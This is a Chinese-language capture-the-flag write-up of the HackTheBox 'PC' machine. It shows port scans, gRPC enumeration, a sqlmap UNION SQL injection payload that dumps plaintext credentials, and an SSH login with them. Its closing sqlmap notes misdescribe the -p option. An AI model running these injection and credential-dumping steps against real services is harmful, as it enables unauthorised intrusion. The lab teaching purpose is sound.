---
title: HTB-PC通关记录
tags:
- HackTheBox
- PC
- WriteUp
---

## 靶机描述

靶机 IP :  10.10.11.214

## 信息收集

### nmap扫描

按照常规的方法：通过 TCP | UDP 扫描端口、获取开放端口对应信息、系统版本信息

下面是通过 TCP 扫描发现的开放端口信息：

```
┌──(kali㉿DESKTOP-OBF4V3F)-[~/Desktop/BoxWalk/HTB/PC]
└─$ sudo nmap -Pn -sT -p- --min-rate 10000 10.10.11.214 -oN nmapscan/portscan.txt
[sudo] password for kali:
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-07 17:19 CST
Nmap scan report for 10.10.11.214
Host is up (0.37s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT      STATE SERVICE
22/tcp    open  ssh
50051/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 84.48 seconds

┌──(kali㉿DESKTOP-OBF4V3F)-[~/Desktop/BoxWalk/HTB/PC]
└─$ sudo nmap -Pn -sU -p- --min-rate 10000 10.10.11.214 -oN nmapscan/uportscan.txt
[sudo] password for kali:
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-07 17:21 CST
Nmap scan report for 10.10.11.214
Host is up (0.40s latency).
Not shown: 65534 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
50051/udp closed unknown

Nmap done: 1 IP address (1 host up) scanned in 16.39 seconds
```



```
┌──(kali㉿DESKTOP-OBF4V3F)-[~/Desktop/BoxWalk/HTB/PC]
└─$ sudo nmap -Pn -sT -sCV -O -p22,50051 --min-rate 10000 10.10.11.214 -oN nmapscan/servscan.txt
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-07 17:29 CST
Nmap scan report for 10.10.11.214
Host is up (0.63s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 91bf44edea1e3224301f532cea71e5ef (RSA)
|   256 8486a6e204abdff71d456ccf395809de (ECDSA)
|_  256 1aa89572515e8e3cf180f542fd0a281c (ED25519)
50051/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port50051-TCP:V=7.93%I=7%D=6/7%Time=64804E04%P=x86_64-pc-linux-gnu%r(NU
SF:LL,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\x06
SF:\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(GenericL
SF:ines,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\x
SF:06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(GetReq
SF:uest,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\x
SF:06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(HTTPOp
SF:tions,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\
SF:x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(RTSPR
SF:equest,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0
SF:\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(RPCC
SF:heck,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\x
SF:06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(DNSVer
SF:sionBindReqTCP,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\x
SF:ff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0"
SF:)%r(DNSStatusRequestTCP,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\
SF:x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0
SF:\0\?\0\0")%r(Help,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\
SF:?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0
SF:\0")%r(SSLSessionReq,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05
SF:\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\
SF:?\0\0")%r(TerminalServerCookie,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff
SF:\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\
SF:0\0\0\0\0\?\0\0")%r(TLSSessionReq,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\
SF:xff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08
SF:\0\0\0\0\0\0\?\0\0")%r(Kerberos,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xf
SF:f\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0
SF:\0\0\0\0\0\?\0\0")%r(SMBProgNeg,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xf
SF:f\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0
SF:\0\0\0\0\0\?\0\0")%r(X11Probe,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\
SF:xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0
SF:\0\0\0\0\?\0\0");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (92%), Linux 5.0 (92%), Linux 5.0 - 5.4 (91%), Linux 5.3 - 5.4 (91%), Linux 2.6.32 (91%), Linux 5.0 - 5.3 (90%), Crestron XPanel control system (90%), Linux 5.4 (89%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%)        No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 100.11 seconds
```

50051 端口是 gRPC 服务的端口，（途径：Github）

```
# Change Goproxy
export GOPROXY=https://goproxy.cn
# install grpcurl
go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest
```

```
cd /
# /etc/profile
export $GOROOT=/usr/local/go
export $GOPATH=/home/kali/go
export PATH=$PATH:$GOROOT/bin
export PATH=$PATH:$GOPATH/bin
```

grpcurl
```
┌──(kali㉿DESKTOP-OBF4V3F)-[~/Desktop/BoxWalk/HTB/PC]
└─$ grpcurl -h
Usage:
        grpcurl [flags] [address] [list|describe] [symbol]

The 'address' is only optional when used with 'list' or 'describe' and a
protoset or proto flag is provided.

If 'list' is indicated, the symbol (if present) should be a fully-qualified
service name. If present, all methods of that service are listed. If not
present, all exposed services are listed, or all services defined in protosets.

If 'describe' is indicated, the descriptor for the given symbol is shown. The
symbol should be a fully-qualified service, enum, or message name. If no symbol
is given then the descriptors for all exposed or known services are shown.

If neither verb is present, the symbol must be a fully-qualified method name in
'service/method' or 'service.method' format. In this case, the request body will
be used to invoke the named method. If no body is given but one is required
(i.e. the method is unary or server-streaming), an empty instance of the
method's request type will be sent.

The address will typically be in the form "host:port" where host can be an IP
address or a hostname and port is a numeric port or service name. If an IPv6
address is given, it must be surrounded by brackets, like "[2001:db8::1]". For
Unix variants, if a -unix=true flag is present, then the address must be the
path to the domain socket.
```

```
┌──(kali㉿DESKTOP-OBF4V3F)-[~/Desktop/BoxWalk/HTB/PC]
└─$ grpcurl -plaintext 10.10.11.214:50051 list
SimpleApp
grpc.reflection.v1alpha.ServerReflection

┌──(kali㉿DESKTOP-OBF4V3F)-[~/Desktop/BoxWalk/HTB/PC]
└─$ grpcurl -plaintext 10.10.11.214:50051 list SimpleApp
SimpleApp.LoginUser
SimpleApp.RegisterUser
SimpleApp.getInfo

┌──(kali㉿DESKTOP-OBF4V3F)-[~/Desktop/BoxWalk/HTB/PC]
└─$ grpcurl -plaintext 10.10.11.214:50051 describe SimpleApp
SimpleApp is a service:
service SimpleApp {
  rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );
  rpc RegisterUser ( .RegisterUserRequest ) returns ( .RegisterUserResponse );
  rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );
}
```

```
┌──(kali㉿DESKTOP-OBF4V3F)-[~/Desktop/BoxWalk/HTB/PC]
└─$ grpcurl -plaintext 10.10.11.214:50051 describe .RegisterUserRequest
RegisterUserRequest is a message:
message RegisterUserRequest {
  string username = 1;
  string password = 2;
}

┌──(kali㉿DESKTOP-OBF4V3F)-[~/Desktop/BoxWalk/HTB/PC]
└─$ grpcurl -plaintext 10.10.11.214:50051 describe .LoginUserRequest
LoginUserRequest is a message:
message LoginUserRequest {
  string username = 1;
  string password = 2;
}

┌──(kali㉿DESKTOP-OBF4V3F)-[~/Desktop/BoxWalk/HTB/PC]
└─$ grpcurl -plaintext 10.10.11.214:50051 describe .getInfoRequest
getInfoRequest is a message:
message getInfoRequest {
  string id = 1;
}
```

```
┌──(kali㉿DESKTOP-OBF4V3F)-[~/Desktop/BoxWalk/HTB/PC]
└─$ grpcurl -d '{"username":"admin","password":"admin"}' -plaintext 10.10.11.214:50051 SimpleApp.LoginUser
{
  "message": "Your id is 768."
}

┌──(kali㉿DESKTOP-OBF4V3F)-[~/Desktop/BoxWalk/HTB/PC]
└─$ grpcurl -vv -d '{"username":"admin","password":"admin"}' -plaintext 10.10.11.214:50051 SimpleApp.LoginUser

Resolved method descriptor:
rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );

Request metadata to send:
(empty)

Response headers received:
content-type: application/grpc
grpc-accept-encoding: identity, deflate, gzip

Estimated response size: 16 bytes

Response contents:
{
  "message": "Your id is 33."
}

Response trailers received:
token: b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODcxMTkxMzV9.kZacDAWwQJFdTb420SmvGJjerGN_qElGIqxc5Djx9SU'
Sent 1 request and received 1 response
```


```
kali@DESKTOP-OBF4V3F:~$ grpcui -plaintext  10.10.11.214:50051
gRPC Web UI available at http://127.0.0.1:34417/
[GFX1-]: No GPUs detected via PCI
[GFX1-]: glxtest: process failed (received signal 11)
Missing chrome or resource URL: resource://gre/modules/UpdateListener.jsm
Missing chrome or resource URL: resource://gre/modules/UpdateListener.sys.mjs
```

![grpcui](2023-06-19-01-03-31.png)



Chrome + SwitchOmega

Options-No-proxy

```
<-loopback>
```


JWT

```
token:b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODc4NDY0NDN9.12U74eYXtA48KQwH7RIygyxEQ850zsBXgoWNsnbNLuw'
=======================================================

{
    "payload": {
        "user_id": "admin",
        "exp": 1687846443
    }
}
```


sqlmap

```
sqlmap -r id.req --dbms=sqlite --batch
---
Parameter: JSON #1* ((custom) POST)
    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: {"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODc4NDY0NDN9.12U74eYXtA48KQwH7RIy
gyxEQ850zsBXgoWNsnbNLuw"}],"data":[{"id":"769 UNION ALL SELECT CHAR(113,120,118,107,113)||CHAR(100,77,102,114,78,99,111,113,116,70,113,90,79,68,104,80,115,71
,77,117,78,108,114,109,105,120,97,100,117,99,72,99,72,83,115,104,70,65,86,90)||CHAR(113,122,112,106,113)-- Klui"}]}
---

sqlmap -r id.req --dump --batch

Database: <current>
Table: accounts
[2 entries]
+------------------------+----------+
| password               | username |
+------------------------+----------+
| admin                  | admin    |
| HereIsYourPassWord1431 | sau      |
+------------------------+----------+
```

ssh

```
ssh sau@pc.htb

sau@pc:~$ uname
Linux
sau@pc:~$ uname -a
Linux pc 5.4.0-148-generic #165-Ubuntu SMP Tue Apr 18 08:53:12 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
sau@pc:~$ id
uid=1001(sau) gid=1001(sau) groups=1001(sau)
sau@pc:~$ sudo -l
[sudo] password for sau: 
Sorry, user sau may not run sudo on localhost.
sau@pc:~$ whoami
sau
sau@pc:~$ 

```

## 总结

### 新技巧和新知识

1. `/etc/hosts` 文件修改：命名靶机 IP ，无需自己再反复记忆IP地址
2. sqlmap 自定义注入标记：在 request 包或 url 请求中使用 `*` 标记注入点


在SQLmap中，自定义注入标记（Custom Injection Marker）是一个用于标记注入点的字符串，SQLmap将会通过查找该字符串来确定注入点的位置。默认情况下，SQLmap使用*作为自定义注入标记。

您可以通过在目标URL中插入自定义注入标记来告诉SQLmap注入点的位置。例如，如果您的目标URL为http://example.com/vuln.php?id=1，并且注入点在id参数处，您可以将URL修改为http://example.com/vuln.php?id=*，这样SQLmap就会自动识别注入点。

以下是一个使用自定义注入标记的示例命令：
```
sqlmap -u "http://example.com/vuln.php?id=*" --batch --dbms mysql -p username,password
```

在这个示例中，SQLmap将使用自定义注入标记来标记注入点的位置。-p选项用于指定用户名和密码。

请注意，如果您的目标URL中包含 `*` 字符，您需要将其转义为 `\*` ，否则SQLmap可能会将其解释为注入标记。例如，如果您的URL为 `http://example.com/vuln.php?id=1*` ，则应该使用 `http://example.com/vuln.php?id=1\*` 来表示。